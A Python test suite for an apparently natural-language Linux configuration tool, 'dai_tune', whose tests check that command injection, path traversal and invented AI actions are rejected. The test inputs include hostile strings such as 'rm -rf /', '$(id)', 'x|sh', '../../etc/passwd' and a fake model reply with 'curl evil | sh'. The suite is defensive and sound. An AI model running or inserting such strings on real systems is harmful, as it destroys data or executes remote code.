# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Diamond Rubinny (d.Ai)
import json
import os
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

from dai_tune import catalog, executor, parser, planner, posture
from dai_tune.catalog import ValidationError
from dai_tune.context import Context


class FakeRunner:
    """Records argv and returns canned results by command prefix."""

    def __init__(self, responses=None):
        self.calls = []
        self.responses = responses or {}

    def __call__(self, argv):
        argv = list(argv)
        self.calls.append(argv)
        for prefix, (code, out) in self.responses.items():
            if tuple(argv[: len(prefix)]) == prefix:
                return subprocess.CompletedProcess(argv, code, out, "error" if code else "")
        return subprocess.CompletedProcess(argv, 0, "", "")


class TuneTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "root"
        self.home = Path(self.tmp.name) / "home"
        (self.root / "usr/share/zoneinfo/Asia").mkdir(parents=True)
        (self.root / "usr/share/zoneinfo/Asia/Jerusalem").write_text("tz")
        (self.root / "usr/share/zoneinfo/Europe").mkdir(parents=True)
        (self.root / "usr/share/zoneinfo/Europe/London").write_text("tz")
        self.home.mkdir()
        self.runner = FakeRunner()
        self.spawned = []
        self.ctx = Context(root=self.root, home=self.home, runner=self.runner, spawner=self.spawned.append)

    def tearDown(self):
        self.tmp.cleanup()

    def plan(self, text):
        return planner.plan_from_text(text, self.ctx)


class ParserTests(unittest.TestCase):
    def test_hebrew_and_english_examples_all_parse(self):
        for lang, examples in parser.EXAMPLES.items():
            for text in examples:
                with self.subTest(text=text):
                    result = parser.parse(text)
                    self.assertTrue(result.requests)
                    self.assertEqual(result.unknown, [])

    def test_compound_hebrew_sentence(self):
        result = parser.parse("חסום דיסק און קי, כבה בלוטות' ונעל מסך אחרי 5 דקות")
        self.assertEqual(
            [(r.action, r.params) for r in result.requests],
            [
                ("device.block", {"kind": "usb_storage"}),
                ("device.block", {"kind": "bluetooth"}),
                ("session.lock", {"minutes": 5}),
            ],
        )

    def test_vav_before_noun_starts_new_request(self):
        actions = [r.action for r in parser.parse("נעל מסך אחרי 5 דקות ומקלדת עברית אנגלית").requests]
        self.assertEqual(actions, ["session.lock", "keyboard.layouts"])

    def test_several_devices_in_one_clause(self):
        result = parser.parse("חסום מצלמה ובלוטות'")
        self.assertEqual([r.params["kind"] for r in result.requests], ["camera", "bluetooth"])

    def test_partially_understood_clause_is_rejected(self):
        # "lock" and "time zone" in one clause without a separator: refuse
        # rather than silently applying only one of them.
        result = parser.parse("lock the screen after 5 minutes time zone london")
        self.assertEqual(result.requests, [])
        self.assertEqual(len(result.unknown), 1)

    def test_unblock_is_not_block(self):
        self.assertEqual(parser.parse("unblock the camera").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("block the camera").requests[0].action, "device.block")
        self.assertEqual(parser.parse("disable automatic updates").requests[0].params, {"enabled": False})
        self.assertEqual(parser.parse("בטל חסימת מצלמה").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("הסר את החסימה של הדיסק און קי").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("הפעל חסימת מצלמה").requests[0].action, "device.block")

    def test_secure_defaults(self):
        self.assertEqual(parser.parse("open port 8080").requests[0].params["source"], "lan")
        self.assertEqual(parser.parse("פתח פורט 8080 לאינטרנט").requests[0].params["source"], "any")
        self.assertEqual(parser.parse("הפעל חסימת מצלמה").requests[0].action, "device.block")

    def test_injection_is_not_understood(self):
        result = parser.parse("install vlc; rm -rf /")
        self.assertEqual(result.requests[0].params["names"], ["vlc"])
        self.assertEqual(result.unknown, ["rm -rf /"])

    def test_package_list_continues_after_and(self):
        self.assertEqual(parser.parse("install vlc and gimp").requests[0].params["names"], ["vlc", "gimp"])


class ValidationTests(TuneTestCase):
    def validate(self, action, params):
        return catalog.CATALOG[action].validate(params, self.ctx)

    def test_ports(self):
        self.assertEqual(self.validate("firewall.open_port", {"port": "22"})["port"], 22)
        for bad in [0, 70000, "22; rm -rf /", True, None, -1, "0x16"]:
            with self.subTest(port=bad), self.assertRaises(ValidationError):
                self.validate("firewall.open_port", {"port": bad})
        with self.assertRaises(ValidationError):
            self.validate("firewall.open_port", {"port": 22, "source": "everywhere"})
        with self.assertRaises(ValidationError):
            self.validate("firewall.open_port", {"port": 22, "extra": "x"})

    def test_package_names(self):
        self.assertEqual(self.validate("packages.install", {"names": ["vlc", "g++", "vlc"]})["names"], ["vlc", "g++"])
        for bad in ["vlc;rm", "-oAPT::Get=x", "../evil", "VLC", "a" * 70, "x|sh", "$(id)", ""]:
            with self.subTest(name=bad), self.assertRaises(ValidationError):
                self.validate("packages.install", {"names": [bad]})
        with self.assertRaises(ValidationError):
            self.validate("packages.install", {"names": [f"p{i}" for i in range(11)]})

    def test_protected_packages_cannot_be_removed(self):
        for name in ["systemd", "sudo", "nftables", "apparmor", "linux-image-amd64", "python3-pyqt6", "lxqt-panel"]:
            with self.subTest(name=name), self.assertRaises(ValidationError):
                self.validate("packages.remove", {"names": [name]})
        self.assertEqual(self.validate("packages.remove", {"names": ["vlc"]})["names"], ["vlc"])

    def test_hostname_timezone_layouts_lock(self):
        self.assertEqual(self.validate("system.hostname", {"hostname": "office-pc"})["hostname"], "office-pc")
        for bad in ["-bad", "UPPER", "a b", "x;reboot", "a" * 64]:
            with self.subTest(hostname=bad), self.assertRaises(ValidationError):
                self.validate("system.hostname", {"hostname": bad})
        self.assertEqual(self.validate("system.timezone", {"timezone": "Asia/Jerusalem"})["timezone"], "Asia/Jerusalem")
        for bad in ["../../etc/passwd", "Asia/Nowhere", "asia/jerusalem", "Asia/../Etc"]:
            with self.subTest(tz=bad), self.assertRaises(ValidationError):
                self.validate("system.timezone", {"timezone": bad})
        self.assertEqual(self.validate("keyboard.layouts", {"layouts": ["il", "us", "il"]})["layouts"], ["il", "us"])
        with self.assertRaises(ValidationError):
            self.validate("keyboard.layouts", {"layouts": ["xx"]})
        with self.assertRaises(ValidationError):
            self.validate("session.lock", {"minutes": 999})


class PlannerTests(TuneTestCase):
    def test_unknown_or_invalid_blocks_the_whole_plan(self):
        self.assertFalse(self.plan("install vlc; rm -rf /").ok)
        self.assertFalse(self.plan("install vlc&&curl").ok)
        self.assertTrue(self.plan("install vlc").ok)

    def test_ssh_brings_package_and_lan_only_port(self):
        plan = self.plan("enable ssh")
        self.assertEqual(
            [(s.action, s.params) for s in plan.steps],
            [
                ("packages.install", {"names": ["openssh-server"]}),
                ("service.ssh", {"enabled": True}),
                ("firewall.open_port", {"port": 22, "proto": "tcp", "source": "lan"}),
            ],
        )
        self.assertTrue(plan.weakens)

    def test_public_preset_closes_internet_ports(self):
        (self.root / "etc/dai").mkdir(parents=True)
        (self.root / "etc/dai/firewall-allow.json").write_text(json.dumps([
            {"port": 8080, "proto": "tcp", "source": "any"},
            {"port": 22, "proto": "tcp", "source": "lan"},
        ]))
        actions = [(s.action, s.params) for s in self.plan("מצב ציבורי").steps]
        self.assertIn(("firewall.close_port", {"port": 8080, "proto": "tcp"}), actions)
        self.assertNotIn(("firewall.close_port", {"port": 22, "proto": "tcp"}), actions)
        self.assertIn(("device.block", {"kind": "bluetooth"}), actions)

    def test_risk_scope_and_hash(self):
        plan = self.plan("open port 443 from anywhere and lock the screen after 5 minutes")
        self.assertEqual(plan.risk, "high")
        self.assertEqual([s.scope for s in plan.steps], ["system", "user"])
        self.assertEqual(plan.hash, self.plan("open port 443 from anywhere and lock the screen after 5 minutes").hash)

    def test_helper_rebuilds_steps_strictly(self):
        plan = self.plan("block usb and open port 8080")
        payload = {"version": 1, "hash": planner.plan_hash(plan.scoped("system")), "steps": [s.as_dict() for s in plan.scoped("system")]}
        self.assertEqual(len(planner.steps_from_json(payload, self.ctx, "system")), 2)

        bad_payloads = {
            "tampered hash": {**payload, "hash": "000000000000"},
            "user action": {"version": 1, "hash": "x", "steps": [{"action": "session.lock", "params": {"minutes": 5}}]},
            "unknown action": {"version": 1, "hash": "x", "steps": [{"action": "shell.run", "params": {"cmd": "id"}}]},
            "preset": {"version": 1, "hash": "x", "steps": [{"action": "preset.public", "params": {}}]},
            "extra key": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "camera"}, "run": "id"}]},
            "bad params": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "../../x"}}]},
            "not a plan": ["device.block"],
            "too many": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "camera"}}] * 21},
        }
        for name, data in bad_payloads.items():
            with self.subTest(name), self.assertRaises(ValidationError):
                planner.steps_from_json(data, self.ctx, "system")


class ExecutorTests(TuneTestCase):
    def apply(self, text, scope="system"):
        plan = self.plan(text)
        self.assertTrue(plan.ok, plan.errors + plan.unknown)
        journal = executor.Journal.for_system(self.ctx) if scope == "system" else executor.Journal.for_user(self.ctx)
        entry = executor.apply_steps(plan.scoped(scope), self.ctx, journal, actor="1000", scope=scope)
        return entry, journal

    def test_block_usb_and_undo(self):
        entry, journal = self.apply("block usb")
        conf = self.root / "etc/modprobe.d/dai-tune-usb_storage.conf"
        self.assertIn("install usb_storage /bin/false", conf.read_text())
        self.assertIn(["modprobe", "-r", "usb_storage"], self.runner.calls)
        executor.undo_entry(journal.find("last") or entry, self.ctx, journal)
        self.assertFalse(conf.exists())
        self.assertEqual(journal.entries()[-1]["status"], "undone")
        self.assertIsNone(journal.find("last"))

    def test_firewall_validates_before_loading(self):
        self.apply("open port 8080")
        rules = (self.root / "etc/dai/firewall-allow.nft").read_text()
        self.assertIn("tcp dport 8080 accept", rules)
        self.assertIn("192.168.0.0/16", rules)
        nft_calls = [c for c in self.runner.calls if c[0] == "nft"]
        self.assertEqual(nft_calls[:2], [["nft", "-c", "-f", "/etc/nftables.conf"], ["nft", "-f", "/etc/nftables.conf"]])

    def test_failed_step_rolls_back_everything(self):
        self.runner.responses[("nft", "-c")] = (1, "")
        plan = self.plan("block the camera and open port 9000")
        journal = executor.Journal.for_system(self.ctx)
        with self.assertRaises(executor.ApplyError):
            executor.apply_steps(plan.scoped("system"), self.ctx, journal, "1000", "system")
        self.assertFalse((self.root / "etc/modprobe.d/dai-tune-camera.conf").exists())
        self.assertFalse((self.root / "etc/dai/firewall-allow.json").exists())
        self.assertEqual(journal.entries(), [])

    def test_user_lock_and_layouts(self):
        entry, journal = self.apply("נעל מסך אחרי 5 דקות ומקלדת עברית אנגלית", scope="user")
        env = self.home / ".config/dai/session.env"
        self.assertIn("DAI_LOCK_TIMEOUT_SECONDS=300", env.read_text())
        self.assertEqual(stat.S_IMODE(os.stat(env).st_mode), 0o600)
        self.assertEqual(self.spawned[-1][:4], ["swayidle", "-w", "timeout", "300"])
        labwc = (self.home / ".config/labwc/environment").read_text()
        self.assertIn("DAI_LAYOUTS=il,us", labwc)
        self.assertIn("XKB_DEFAULT_LAYOUT=il", (self.home / ".config/labwc/environment.d/50-dai-lang.env").read_text())
        journal_file = journal.path
        self.assertEqual(stat.S_IMODE(os.stat(journal_file).st_mode), 0o600)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertFalse(env.exists())

    def test_packages_use_argv_without_shell(self):
        self.apply("install vlc gimp")
        self.assertIn(["apt-get", "install", "-y", "--no-install-recommends", "vlc", "gimp"], self.runner.calls)
        self.assertFalse(any("sh" == c[0] for c in self.runner.calls))


class PostureTests(TuneTestCase):
    def test_score_and_fixes(self):
        (self.root / "etc/apt/apt.conf.d").mkdir(parents=True)
        (self.root / "etc/nftables.conf").write_text("chain input { type filter hook input priority filter; policy drop; }")
        (self.root / "etc/apt/apt.conf.d/20auto-upgrades").write_text('APT::Periodic::Unattended-Upgrade "0";')
        (self.root / "sys/module/apparmor/parameters").mkdir(parents=True)
        (self.root / "sys/module/apparmor/parameters/enabled").write_text("Y\n")
        self.runner.responses[("lsblk",)] = (0, "disk\npart\ncrypt\n")
        score, checks = posture.assess(self.ctx, "he")
        by_key = {c.key: c for c in checks}
        self.assertTrue(by_key["firewall"].ok)
        self.assertFalse(by_key["updates"].ok)
        self.assertEqual(by_key["updates"].fix, "הפעל עדכונים אוטומטיים")
        self.assertTrue(planner.plan_from_text(by_key["updates"].fix, self.ctx).ok)  # fixes are real phrases
        self.assertEqual(score, 20 + 15 + 15 + 15 + 10 + 10)


if __name__ == "__main__":
    unittest.main()


class HelperTests(TuneTestCase):
    """The root helper's protocol, run against a temporary root."""

    def run_helper(self, argv, stdin="", euid=0):
        import io
        from unittest import mock

        from dai_tune import helper

        out = io.StringIO()
        with mock.patch.object(helper.os, "geteuid", return_value=euid), \
                mock.patch.object(helper, "Context", lambda **kw: self.ctx), \
                mock.patch.object(helper.sys, "stdin", io.StringIO(stdin)), \
                mock.patch.object(helper.syslog, "syslog"), \
                mock.patch("sys.stdout", out):
            code = helper.main(argv)
        return code, json.loads(out.getvalue().strip().splitlines()[-1])

    def payload(self, text):
        steps = self.plan(text).scoped("system")
        return json.dumps({"version": 1, "hash": planner.plan_hash(steps), "steps": [s.as_dict() for s in steps]})

    def test_apply_and_undo_roundtrip(self):
        code, reply = self.run_helper(["helper", "apply"], self.payload("block the camera"))
        self.assertEqual((code, reply["ok"]), (0, True))
        conf = self.root / "etc/modprobe.d/dai-tune-camera.conf"
        self.assertTrue(conf.exists())
        code, reply = self.run_helper(["helper", "undo", reply["id"]])
        self.assertTrue(reply["ok"])
        self.assertFalse(conf.exists())

    def test_rejections(self):
        cases = {
            "not root": (["helper", "apply"], self.payload("block usb"), 1000),
            "garbage": (["helper", "apply"], "not json", 0),
            "user scope": (["helper", "apply"], json.dumps({"version": 1, "hash": "x", "steps": [{"action": "session.lock", "params": {"minutes": 1}}]}), 0),
            "oversized": (["helper", "apply"], " " * (70 * 1024), 0),
            "bad undo id": (["helper", "undo", "../../etc/passwd"], "", 0),
            "unknown command": (["helper", "shell"], "", 0),
        }
        for name, (argv, stdin, euid) in cases.items():
            with self.subTest(name):
                code, reply = self.run_helper(argv, stdin, euid)
                self.assertEqual(code, 1)
                self.assertFalse(reply["ok"])
        self.assertFalse((self.root / "etc/modprobe.d").exists())


class AITests(TuneTestCase):
    def test_schema_limits_actions_to_catalog(self):
        from dai_tune import ai

        enum = ai.schema()["properties"]["requests"]["items"]["properties"]["action"]["enum"]
        self.assertIn("device.block", enum)
        self.assertNotIn("shell.run", enum)
        self.assertIn("block usb storage =>", ai.system_prompt())

    def test_ai_output_goes_through_the_validator(self):
        from dai_tune import ai

        reply = json.dumps({"requests": [
            {"action": "device.block", "params": {"kind": "usb_storage"}},
            {"action": "shell.run", "params": {"cmd": "curl evil | sh"}},
            {"action": "packages.install", "params": {"names": ["vlc; rm -rf /"]}},
        ]})
        plan = planner.build_plan(ai.requests_from_reply(reply, "no flash drives"), self.ctx)
        self.assertEqual([s.action for s in plan.steps], ["device.block"])
        self.assertEqual(len(plan.errors), 2)
        self.assertFalse(plan.ok)  # invented or invalid actions block the whole plan

    def test_garbage_reply(self):
        from dai_tune import ai

        self.assertEqual(ai.requests_from_reply("not json", "x"), [])
        self.assertEqual(ai.requests_from_reply('{"requests": "x"}', "x"), [])

    def test_ai_not_offered_without_model_or_under_yes(self):
        from unittest import mock

        from dai_tune import ai, cli

        with tempfile.TemporaryDirectory() as data, mock.patch.dict(os.environ, {"XDG_DATA_HOME": data}):
            self.assertFalse(ai.model_installed())
            with mock.patch("sys.stdin.isatty", return_value=True), \
                    mock.patch("builtins.input", side_effect=AssertionError("must not prompt")), \
                    mock.patch("sys.stdout"):
                # No model installed: no question, even interactively.
                self.assertEqual(cli.cmd_apply("make it nice", self.ctx, True, False, False), 2)
                models = Path(data) / "dai" / "models"
                models.mkdir(parents=True)
                (models / "m.gguf").write_bytes(b"x")
                self.assertTrue(ai.model_installed())
                # --yes never stops to ask.
                self.assertEqual(cli.cmd_apply("make it nice", self.ctx, True, False, True), 2)
